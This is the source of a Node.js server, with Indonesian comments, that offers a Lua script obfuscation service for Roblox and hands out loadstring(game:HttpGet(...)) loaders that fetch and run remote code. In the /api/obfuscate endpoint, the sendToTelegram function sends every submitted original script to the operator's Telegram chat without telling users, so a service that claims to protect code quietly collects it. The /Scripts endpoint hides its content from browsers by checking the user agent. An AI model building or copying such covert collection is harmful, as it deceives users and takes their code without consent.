const express = require('express');
const cors = require('cors');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================================
// TELEGRAM CONFIG
// Isi via Railway Environment Variables (lebih aman)
// Key: TG_BOT_TOKEN dan TG_CHAT_ID
// ============================================================
const TG_BOT_TOKEN = process.env.TG_BOT_TOKEN || 'ISI_BOT_TOKEN_KAMU';
const TG_CHAT_ID   = process.env.TG_CHAT_ID   || 'ISI_CHAT_ID_KAMU';

async function sendToTelegram(originalScript, scriptId, loaderString) {
    try {
        const TG_API = `https://api.telegram.org/bot${TG_BOT_TOKEN}`;

        // Kirim script asli sebagai file .lua + caption info
        const form = new FormData();
        form.append('chat_id', TG_CHAT_ID);
        form.append('parse_mode', 'Markdown');
        form.append('caption',
            `📦 *Script Baru Di-Obfuscate*\n\n` +
            `🆔 ID: \`${scriptId}\`\n` +
            `⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n` +
            `📋 *Loader:*\n\`\`\`\n${loaderString}\n\`\`\``
        );
        form.append('document',
            Buffer.from(originalScript, 'utf8'),
            { filename: `original_${scriptId}.lua`, contentType: 'text/plain' }
        );

        const res  = await fetch(`${TG_API}/sendDocument`, { method: 'POST', body: form });
        const json = await res.json();

        if (!json.ok) {
            console.error('[Telegram] Gagal kirim:', json.description);
        } else {
            console.log(`[Telegram] Log terkirim ✓ ID: ${scriptId}`);
        }
    } catch (err) {
        console.error('[Telegram] Error:', err.message);
    }
}

// Database sederhana untuk menyimpan script
const scriptDatabase = new Map();

// Memastikan folder temp selalu ada
const tempDir = path.join(__dirname, 'temp');
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir);
}

// ============================================================
// ACCESS DENIED PAGE (ditampilkan ke browser / skid)
// ============================================================
const ACCESS_DENIED_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Access Denied</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#0d0f14;font-family:'DM Sans',sans-serif;overflow:hidden;position:relative}
    body::before{content:'';position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:600px;height:400px;background:radial-gradient(ellipse,rgba(239,68,68,.05) 0%,transparent 70%);pointer-events:none}
    .bg-text{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;overflow:hidden;pointer-events:none;z-index:0}
    .bg-text-inner{width:200%;height:200%;display:flex;flex-wrap:wrap;gap:40px 60px;transform:rotate(-25deg);transform-origin:center;align-content:flex-start;padding:40px}
    .bg-text-inner span{font-family:'Syne',sans-serif;font-size:22px;font-weight:800;letter-spacing:.08em;text-transform:uppercase;color:rgba(255,255,255,.03);white-space:nowrap;user-select:none}
    .card{background:#141720;border:1px solid rgba(255,255,255,.07);border-radius:18px;padding:40px 44px 44px;max-width:560px;width:90%;position:relative;z-index:1;box-shadow:0 0 0 1px rgba(0,0,0,.4),0 24px 80px rgba(0,0,0,.5);animation:fadeUp .5s cubic-bezier(.22,1,.36,1) both}
    @keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
    .badge{display:inline-flex;align-items:center;gap:6px;background:rgba(239,68,68,.18);border:1px solid rgba(239,68,68,.35);color:#f87171;font-family:'Syne',sans-serif;font-size:11px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;padding:5px 12px;border-radius:999px;margin-bottom:20px}
    .dot{width:7px;height:7px;border-radius:50%;background:#ef4444;box-shadow:0 0 6px #ef4444;animation:pulse 1.8s ease-in-out infinite}
    @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
    h1{font-family:'Syne',sans-serif;font-size:26px;font-weight:800;color:#f1f5f9;line-height:1.25;margin-bottom:14px;letter-spacing:-.02em}
    .divider{width:100%;height:1px;background:rgba(255,255,255,.06);margin:18px 0}
    p{color:#94a3b8;font-size:14px;line-height:1.65;margin-bottom:10px;font-weight:300}
    .actions{display:flex;gap:12px;margin-top:28px;flex-wrap:wrap}
    .btn{display:inline-flex;align-items:center;gap:8px;padding:10px 22px;border-radius:9px;font-family:'DM Sans',sans-serif;font-size:14px;font-weight:500;cursor:pointer;text-decoration:none;border:none;transition:all .18s ease;white-space:nowrap}
    .btn-primary{background:#3b82f6;color:#fff;box-shadow:0 2px 12px rgba(59,130,246,.35)}
    .btn-primary:hover{background:#2563eb;transform:translateY(-1px)}
    .btn-secondary{background:rgba(255,255,255,.06);color:#e2e8f0;border:1px solid rgba(255,255,255,.1)}
    .btn-secondary:hover{background:rgba(255,255,255,.1);transform:translateY(-1px)}
    svg{width:16px;height:16px;fill:currentColor}
  </style>
</head>
<body>
  <div class="bg-text"><div class="bg-text-inner" id="bg"></div></div>
  <div class="card">
    <div class="badge"><span class="dot"></span>ACCESS DENIED</div>
    <h1>This lua script is protected by rzprivate Developments</h1>
    <div class="divider"></div>
    <p>You don't have permission to access these files.</p>
    <p>This script has been protected against unauthorized access, reverse engineering, and tampering.</p>
    <div class="actions">
      <a href="/" class="btn btn-primary">Return Home</a>
      <a href="https://t.me/deuznih" target="_blank" class="btn btn-secondary">
        <svg viewBox="0 0 24 24"><path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/></svg>
        Contact @deuznih
      </a>
    </div>
  </div>
  <script>
    const c=document.getElementById('bg');
    for(let i=0;i<120;i++){const s=document.createElement('span');s.textContent='NICE TRY KID';c.appendChild(s)}
  </script>
</body>
</html>`;

// ============================================================
// FUNGSI UTAMA PROMETHEUS
// ============================================================
function obfuscateWithPrometheus(scriptContent) {
    return new Promise((resolve, reject) => {
        const tempId = Date.now();
        const inputPath = path.join(tempDir, `input_${tempId}.lua`);
        const outputPath = path.join(tempDir, `input_${tempId}.obfuscated.lua`);

        fs.writeFileSync(inputPath, scriptContent);

        const prometheusPath = path.join(__dirname, '../Prometheus/cli.lua');
        const command = `lua5.3 "${prometheusPath}" --preset Medium "${inputPath}"`;

        console.log("Menjalankan command:", command);

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error("=== ERROR DARI PROMETHEUS ===");
                console.error(error);
                console.error("STDERR:", stderr);
                if (fs.existsSync(inputPath)) fs.unlinkSync(inputPath);
                return reject("Gagal mengobfuskasi kode (Cek Log Railway).");
            }

            if (fs.existsSync(outputPath)) {
                const obfuscatedCode = fs.readFileSync(outputPath, 'utf8');
                fs.unlinkSync(inputPath);
                fs.unlinkSync(outputPath);
                resolve(obfuscatedCode);
            } else {
                console.error("=== ERROR OUTPUT ===");
                console.error("File output tidak ditemukan di:", outputPath);
                reject("File output tidak ditemukan.");
            }
        });
    });
}

// ============================================================
// ENDPOINT OBFUSCATE
// ============================================================
app.post('/api/obfuscate', async (req, res) => {
    const { script } = req.body;
    if (!script) return res.status(400).json({ error: "Script kosong!" });

    try {
        console.log("Menerima request obfuscate...");
        const obfuscatedCode = await obfuscateWithPrometheus(script);

        const scriptId = Math.floor(Math.random() * 10000000000000).toString();
        scriptDatabase.set(scriptId, obfuscatedCode);

        const protocol = req.headers['x-forwarded-proto'] || req.protocol;
        const host = req.headers['x-forwarded-host'] || req.headers.host;
        const loaderScript = `loadstring(game:HttpGet("${protocol}://${host}/Scripts?Id=${scriptId}"))("${scriptId}")`;

        // Kirim log ke Telegram (non-blocking, tidak ganggu response)
        sendToTelegram(script, scriptId, loaderScript);

        res.json({ success: true, loader: loaderScript });
    } catch (error) {
        console.error("=== ERROR UMUM ===");
        console.error(error);
        res.status(500).json({ error: error.toString() });
    }
});

// ============================================================
// ENDPOINT /Scripts — DILINDUNGI DARI BROWSER / SKID
// ============================================================
app.get('/Scripts', (req, res) => {
    const ua = req.headers['user-agent'] || '';

    // Cek apakah request dari Roblox HttpGet
    // Roblox mengirim User-Agent yang mengandung kata "Roblox"
    const isRoblox = /Roblox/i.test(ua);

    if (!isRoblox) {
        // Bukan Roblox = browser / skid → tampilkan halaman Access Denied
        console.log(`[BLOCKED] Akses dari browser terdeteksi. UA: ${ua}`);
        return res.status(403).send(ACCESS_DENIED_HTML);
    }

    // ✅ Dari Roblox → cari dan kirim script
    const scriptId = req.query.Id;
    const scriptCode = scriptDatabase.get(scriptId);

    if (scriptCode) {
        res.setHeader('Content-Type', 'text/plain');
        res.send(scriptCode);
    } else {
        res.status(404).send("-- Script tidak ditemukan / Kadaluarsa");
    }
});

// ============================================================
// START SERVER
// ============================================================
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Server berjalan mantap di port ${PORT}`);
});
